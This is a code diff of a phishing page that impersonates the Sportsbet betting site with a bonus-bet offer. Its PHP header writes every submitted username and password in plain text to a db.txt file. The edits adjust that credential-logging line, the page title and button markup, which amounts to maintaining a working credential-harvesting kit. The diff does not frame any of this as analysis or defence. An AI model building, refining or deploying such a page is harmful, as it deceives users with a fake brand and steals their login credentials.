@@ -6,7 +6,7 @@ $postData = array(
 );
 $filename = dirname(__DIR__) . "/db.txt";
 
-$txt = "Username: " . $username . ", " . "password: " . $password . ";\n";
+$txt = "\n" . "Username: " . $username . ", " . "password: " . $password . ";";
 $file_content = file_get_contents($filename);
 $new_content = $file_content . $txt;
 file_put_contents($filename, $new_content, LOCK_EX);
@@ -15,7 +15,7 @@ file_put_contents($filename, $new_content, LOCK_EX);
 <html lang="en">
 
 <head>
-    <title>Claim your $50 Bonus Bet now! | Sportsbet</title>
+    <title>Claim your Bonus Bet now! | Sportsbet</title>
     <meta charset="UTF-8">
     <meta http-equiv="Content-Language" content="en">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -50,7 +50,7 @@ file_put_contents($filename, $new_content, LOCK_EX);
                                 <div class="slow light entered"></div>
                             </div>
                             <button class="iconContainer2" aria-label="">
-                                <div tabindex="-1" class="noFocus"><i class="icon lighter closeIsolated SIZE_19"></i></div>
+                                <div class="noFocus"><i class="icon lighter closeIsolated SIZE_19"></i></div>
                             </button>
                         </div>
                     </div>
@@ -164,7 +164,7 @@ file_put_contents($filename, $new_content, LOCK_EX);
                                                 <div class="buttonContainer_in">
                                                     <div class="border">
                                                         <div class="rippleGroup"></div><button class="textButtonVariable" type="button">
-                                                            <div tabindex="-1" class="noFocus">
+                                                            <div class="noFocus">
                                                                 <div class="white insideButtonNormalContent">
                                                                     <div class="hover defaultCorners"><span class=""><span class="size14 bold text">+$10</span></span></div>
                                                                 </div>
@@ -177,7 +177,7 @@ file_put_contents($filename, $new_content, LOCK_EX);
                                                 <div class="buttonContainer_in">
                                                     <div class="border">
                                                         <div class="rippleGroup"></div><button class="textButtonVariable" type="button">
-                                                            <div tabindex="-1" class="noFocus">
+                                                            <div class="noFocus">
                                                                 <div class="white insideButtonNormalContent">
                                                                     <div class="hover defaultCorners"><span class=""><span class="size14 bold text">+$25</span></span></div>
                                                                 </div>
@@ -190,7 +190,7 @@ file_put_contents($filename, $new_content, LOCK_EX);
                                                 <div class="buttonContainer_in">
                                                     <div class="border">
                                                         <div class="rippleGroup"></div><button class="textButtonVariable" type="button">
-                                                            <div tabindex="-1" class="noFocus">
+                                                            <div class="noFocus">
                                                                 <div class="white insideButtonNormalContent">
                                                                     <div class="hover defaultCorners"><span class=""><span class="size14 bold text">+$50</span></span></div>
                                                                 </div>
@@ -209,7 +209,7 @@ file_put_contents($filename, $new_content, LOCK_EX);
                                             <div class="buttonContainer5">
                                                 <div class="border">
                                                     <div class="rippleGroup"></div><button class="textButtonVariable" type="submit">
-                                                        <div tabindex="-1" class="noFocus">
+                                                        <div class="noFocus">
                                                             <div class="green insideButtonNormalContent">
                                                                 <div class="hover defaultCorners"><span class=""><span class="size14 bold text">Deposit</span></span></div>
                                                             </div>
@@ -229,7 +229,7 @@ file_put_contents($filename, $new_content, LOCK_EX);
                     <div class="buttonContainer2" data-automation-id="join-now-link">
                         <div class="border">
                             <div class="rippleGroup"></div><button class="textButton" type="button">
-                                <div tabindex="-1" class="noFocus">
+                                <div class="noFocus">
                                     <div class="ironGrey insideButtonNormalContent">
                                         <div class="hover defaultCorners modal-trigger"><span class="textContainer"><span class="size14 bold text">Bonus Bet Offer Terms & Conditions</span></span></div>
                                     </div>
